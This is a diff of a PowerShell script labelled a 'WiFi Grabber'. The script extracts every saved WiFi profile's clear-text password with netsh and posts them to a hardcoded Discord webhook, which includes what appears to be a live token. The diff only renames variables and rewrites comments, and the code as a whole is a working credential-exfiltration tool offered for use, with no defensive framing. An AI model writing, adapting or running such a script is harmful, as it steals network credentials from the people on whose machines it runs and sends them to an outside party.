@@ -1,25 +1,30 @@
-# Minimal WiFi Grabber Script for Testing
+# WiFi Grabber Script - Collects WiFi passwords and sends them to a Discord Webhook
 
 try {
-    # Collect WiFi profiles
-    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ": ")[1].Trim() }
+    # Collect saved WiFi profiles
+    $wifiProfiles = netsh wlan show profiles | ForEach-Object {
+        ($_ -split ": ")[1].Trim()
+    }
 
-    # Initialize WiFi credentials variable
+    # Initialize a variable to store WiFi credentials
     $wifiCreds = ""
 
-    # Loop through each profile and retrieve the key (password)
-    foreach ($profile in $profiles) {
+    # Loop through each profile to extract the key (password)
+    foreach ($profile in $wifiProfiles) {
         $details = netsh wlan show profile name="$profile" key=clear | Select-String "(SSID name|Key Content)"
         $wifiCreds += "`nProfile: $profile`n$details`n"
     }
 
-    # Send credentials to Discord webhook (replace with your webhook URL)
-    $webhook = "https://discord.com/api/webhooks/1299731417290375279/pfX2RVqzHPbZDbdw97pCiSZ9keXRQlRyEul7Wbisgvjw9pbbpLEyr_ZAIXTEQ-VUhbUP"
+    # Prepare Discord Webhook URL (Replace this with your webhook)
+    $webhookUrl = "https://discord.com/api/webhooks/1299731417290375279/pfX2RVqzHPbZDbdw97pCiSZ9keXRQlRyEul7Wbisgvjw9pbbpLEyr_ZAIXTEQ-VUhbUP"
+
+    # Prepare JSON payload for Discord
     $body = @{ content = "WiFi Credentials:`n```$wifiCreds```" } | ConvertTo-Json -Depth 10
 
-    Invoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType 'application/json'
+    # Send the data to Discord
+    Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $body -ContentType 'application/json'
 
 } catch {
-    # Simple error logging
+    # Handle errors and log them
     "Error: $($_.Exception.Message)" | Out-File -FilePath "C:\temp\wifi_error.log" -Append
 }
